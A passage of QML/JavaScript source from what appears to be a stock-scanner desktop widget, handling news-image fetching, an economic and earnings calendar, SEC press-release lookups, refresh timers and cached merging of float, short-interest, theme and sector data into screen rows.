        if (!cfg.newsImages || !/^https?:\/\//i.test(url || "") || url in articleImages || imageQueue.indexOf(url) >= 0) return
        imageQueue.push(url)
        pumpImages()
    }
    function pumpImages() {
        while (imageBusy < 3 && imageQueue.length) {
            const url = imageQueue.shift()
            imageBusy++
            imageInflight[url] = { t: Date.now(), req: null }
            const req = NewsFeeds.pageImage(url, img => {
                delete imageInflight[url]
                imageBusy--
                const m = Object.assign({}, articleImages)
                const keys = Object.keys(m)
                if (keys.length > 600) for (const k of keys.slice(0, 200)) delete m[k]
                m[url] = /^https?:\/\//i.test(img) ? img : ""
                articleImages = m
                pumpImages()
            })
            if (imageInflight[url]) imageInflight[url].req = req
        }
    }
    Timer {
        interval: 5000; repeat: true; running: eng.imageBusy > 0
        onTriggered: {
            for (const u in eng.imageInflight) {
                const f = eng.imageInflight[u]
                if (Date.now() - f.t > 15000 && f.req) f.req.cancel()
            }
        }
    }
    function newsFor(sym) {
        return newsByTicker[sym] || newsByTicker[sym.replace(/-USD$/, "")] || null
    }
    Timer {
        interval: Math.max(15, eng.cfg.newsPollSeconds || 60) * 1000
        running: eng.newsSources.length > 0; repeat: true; triggeredOnStart: true
        onTriggered: eng.refreshCustomNews()
    }

    // ── the calendar ──────────────────────────────────────────────────────
    // The economic and earnings calendar, from the scanner's
    // calendar_events.py through the bridge: its own allowlist of economic
    // events (CPI, jobs, rates, the Fed) and its choice of reporters.
    //
    // Kept by day, "YYYY-MM-DD" -> [events], or null for a day whose feed
    // could not be read; a day not yet fetched is absent. The Calendar tab
    // says which span it is showing (wantCalendar) -- a week for the day and
    // week views, five or six for the month -- and that span is fetched
    // when any day of it is missing, then again every 15 minutes, which
    // brings in actual figures as they print. The scanner caches a day two
    // or more days gone for a week, so browsing back costs nothing; a cold
    // month takes about 40 seconds.
    property var calendarDays: ({})
    property date calendarAt
    property bool calendarLoading: false
    property var calendarWant: ({ start: Qt.formatDate(new Date(), "yyyy-MM-dd"), days: 7 })
    property var calendarQueued: null
    function wantCalendar(start, days) {
        calendarWant = { start: start, days: days }
        const d = new Date(start + "T12:00:00")
        for (let i = 0; i < days; i++, d.setDate(d.getDate() + 1))
            if (!(Qt.formatDate(d, "yyyy-MM-dd") in calendarDays)) { loadCalendar(start, days); return }
    }
    function loadCalendar(start, days) {
        if (calendarLoading) { calendarQueued = { start: start, days: days }; return }
        calendarLoading = true
        bridgeRun(["calendar", String(days), start], out => {
            calendarLoading = false
            if (Array.isArray(out)) {
                const m = Object.assign({}, calendarDays)
                for (const d of out) m[d.date] = d.events
                calendarDays = m
                calendarAt = new Date()
            }
            const q = calendarQueued
            calendarQueued = null
            if (q) loadCalendar(q.start, q.days)
        // Urgent: someone is looking at the Calendar, and behind the
        // facts queue a month's cells stayed "…" (2026-10-24).
        }, 240, true)
    }
    function refreshCalendar() { loadCalendar(calendarWant.start, calendarWant.days) }
    // Earnings press releases on SEC EDGAR, "TICKER:YYYY-MM-DD" -> url, or ""
    // when none is filed yet. Asked for reporters that have printed; a miss
    // is asked again after 30 minutes. Needs the SEC contact (Settings → Data).
    property var calendarReleases: ({})
    property var releaseAsked: ({})
    function wantReleases(keys) {
        if (!String(cfg.secContact || "").trim()) return
        const now = Date.now()
        // The ticker is Nasdaq's: only a well-formed symbol and date go on.
        const want = keys.filter(k => {
            const m = /^([^:]+):(\d{4}-\d{2}-\d{2})$/.exec(String(k))
            return m && validSymbol(m[1]) && !calendarReleases[k] && !(now - (releaseAsked[k] || 0) < 30 * 60000)
        })
        if (!want.length) return
        for (const k of want) releaseAsked[k] = now
        for (let i = 0; i < want.length; i += 10)
            bridgeRun(["releases"].concat(want.slice(i, i + 10)), out => {
                if (!out || out.error) return
                const m = Object.assign({}, calendarReleases)
                for (const k of want) {
                    const t = k.split(":")[0]
                    if (t in out) m[k] = out[t] || ""
                }
                calendarReleases = m
            }, 120)
    }
    Timer {
        interval: 15 * 60000; running: true; repeat: true; triggeredOnStart: true
        onTriggered: eng.refreshCalendar()
    }

    Timer {
        interval: 60000; running: true; repeat: true; triggeredOnStart: true
        onTriggered: { eng.currentPhase = eng.phase(); eng.rollDay(); eng.refreshMinute() }
    }
    Timer {
        interval: Math.max(1, eng.currentPhase === "closed" ? eng.cfg.poolClosedMinutes : eng.cfg.poolMinutes) * 60000
        running: true; repeat: true; triggeredOnStart: true
        onTriggered: eng.refreshPool()
    }
    Timer {
        interval: eng.passMs; running: true; repeat: true
        onTriggered: { eng.probe(); eng.pass(); eng.noteThemes() }
    }

    // Rows for a screen. An alert keeps the figures it fired with; the slow
    // facts -- float, short interest, news, dilution -- are merged in as they
    // arrive, the facts filters applied once they have, and the screen's
    // scorecard with them.
    // The theme columns on a row: the story, and its heat. Flattened onto the
    // row so a scorecard rule can test them like any other measure.
    // A stock's theme and sector columns, worked out once per change to the
    // tally, the facts or the news (and at most every 5 seconds for the
    // quotes the traits read), then shared by every row of that stock. Done
    // per row, a screen of a day's alerts took 0.7 s to rebuild, once a
    // second in every open window, and froze the panel (2026-10-26: 95% CPU,
    // 2.4 GB after 80 minutes).
    property int factsGen: 0
    onInfoChanged: factsGen++
    onNewsByTickerChanged: factsGen++
    onThemeStickyChanged: factsGen++
    property var fieldMemo: ({ key: "", t: 0, theme: {}, sector: {} })     // filled in place
    function memoFields(kind, sym, f) {
        const key = themeGen + "/" + factsGen
        const now = Date.now()
        if (fieldMemo.key !== key || now - fieldMemo.t > 5000) {
            fieldMemo.key = key; fieldMemo.t = now; fieldMemo.theme = {}; fieldMemo.sector = {}
        }
        const m = fieldMemo[kind]
        return m[sym] || (m[sym] = f())
    }
    function themeFields(sym) { return memoFields("theme", sym, () => themeFieldsOf(sym)) }
    function sectorFields(sym) { return memoFields("sector", sym, () => sectorFieldsOf(sym)) }
    function themeFieldsOf(sym) {
        if (!cfg.themesOn) return { theme: null }
        const rr = repeatRuns(sym)
        const t = themeOf(sym)
        if (!t) return { theme: null, runs: rr.n, runsText: rr.text }
        const s = themeStatus(t.id)
        return {
            runs: rr.n, runsText: rr.text,
            theme: t,
            themeStatus: ["burnt", "quiet", "building", "hot"].indexOf(s.status),
            themeHeat: s,
            themeMembers: s.n,
            themeRan: s.ran,
            themeFollow: s.follow,
            themeMove: s.med,
            themeLift: s.lift,
            themeStreak: s.streak,
            themeShells: s.shells,
            themeFreshPct: s.fresh
        }
    }

    // The sector columns on a row, as themeFields is for the theme.
    function sectorFieldsOf(sym) {
        if (!cfg.sectorsOn) return { sector: null }
        const t = sectorOf(sym)
        if (!t) return { sector: null }
        const s = themeStatus(t.id)
        return {
            sector: t,
            sectorStatus: ["burnt", "quiet", "building", "hot"].indexOf(s.status),
            sectorHeat: s,
            sectorMembers: s.n,
            sectorRan: s.ran,
            sectorFollow: s.follow,
            sectorMove: s.med,
            sectorBreakdown: sectorBreakdown(t.id)
        }
    }

    function withFacts(g) {
        const n = info[g.symbol] || {}
        const fl = n.finvizFloat > 0 ? n.finvizFloat : n.yahooFloat
        const r = Object.assign({}, g, {
            name: g.name || n.name || "",
            float: fl > 0 ? fl : NaN,
            shortFloat: n.shortFloat >= 0 ? n.shortFloat : n.yahooShortFloat,
            shortShares: n.shortShares,
            catalyst: !!n.catalyst,
            newsTime: n.newsTime || null,
            newsTitle: n.newsTitle || "",
            dilution: n.dilution || null,
            factsKnown: !!n.scanner,
            industry: n.industry || "",
            sector: n.sector || ""
        }, valueFields(g), themeFields(g.symbol), sectorFields(g.symbol))
        r.aboveEma200 = aboveEma200(g.symbol, g.price)
        // Days to cover: the shares sold short over an average day's volume.
        // Short interest is published twice a month, so this is as of
        // `shortDate`, not today.
        const avg = n.avgVol > 0 ? n.avgVol : g.avgVol
        r.dtc = r.shortShares > 0 && avg > 0 ? r.shortShares / avg : NaN
        r.shortDate = n.shortDate || NaN
        const mine = newsFor(g.symbol)
        if (mine && (!r.newsTime || mine.time > r.newsTime)) {
            r.newsTime = mine.time; r.newsTitle = mine.title; r.newsSource = mine.source; r.newsUrl = mine.url
        }
        r.tags = tags(r)
        return r
    }
    function rows(id) { return rowsCached(id) }
    // A screen's rows, rebuilt only when something they are made from has
    // changed (its alerts or list, the facts, news, themes, fundamentals,
    // the 200-day EMAs, the exchange rates, the screens or scorecards), and
    // at least every 10 seconds. Every open window asks for its screen's
    // rows each second; a day's alerts on a screen came to 1,700 rows, each
    // copied with its facts, which kept plasmashell at 40% CPU (2026-10-26).
    property var rowsMemo: ({})                          // id -> {deps, t, list}, filled in place
    function rowsCached(id) {
        const deps = [ranked[id], feeds[id], themeGen, factsGen, valueData, ema200, fx, screens, scorecards]
        const e = rowsMemo[id]
        const now = Date.now()
        if (e && now - e.t < 10000 && e.deps.length === deps.length && e.deps.every((d, i) => d === deps[i])) return e.list
        const list = rowsImpl(id)
        rowsMemo[id] = { deps: deps, t: now, list: list }
        return list
    }
    function rowsImpl(id) {
        const sc = screen(id)
        if (!sc) return []
        const listed = sc.type === "ranked" || sc.type === "value"
        const card = scorecard(sc.scorecard)
        let list = ((listed ? ranked[id] : feeds[id]) || []).map(withFacts).map(r => inCurrency(sc, r))
        // A scorecard with fundamental checks: look them up for rows that
        // have none yet (any company, not only the $2B+ value universe).
        if (card && card.rules.some(r => /^p[1-8]$/.test(r.measure)))
            wantValue(list.slice(0, listed ? Screens.rankCountOf(sc) * 2 : 60).filter(r => !valueData[r.symbol]).map(r => r.symbol))
        if ((sc.filters || {}).aboveEma200)
            wantEma(list.slice(0, listed ? Screens.rankCountOf(sc) * 2 : 60).filter(r => r.aboveEma200 === undefined).map(r => r.symbol))
        list = list.map(r => Object.assign(r, card ? Scorecards.score(card, r) : { score: null, total: 0, failed: [] }))
                   .filter(r => Screens.passes(sc, r, "facts"))
        if (listed) list = list.slice(0, Screens.rankCountOf(sc))
        return list
    }
}
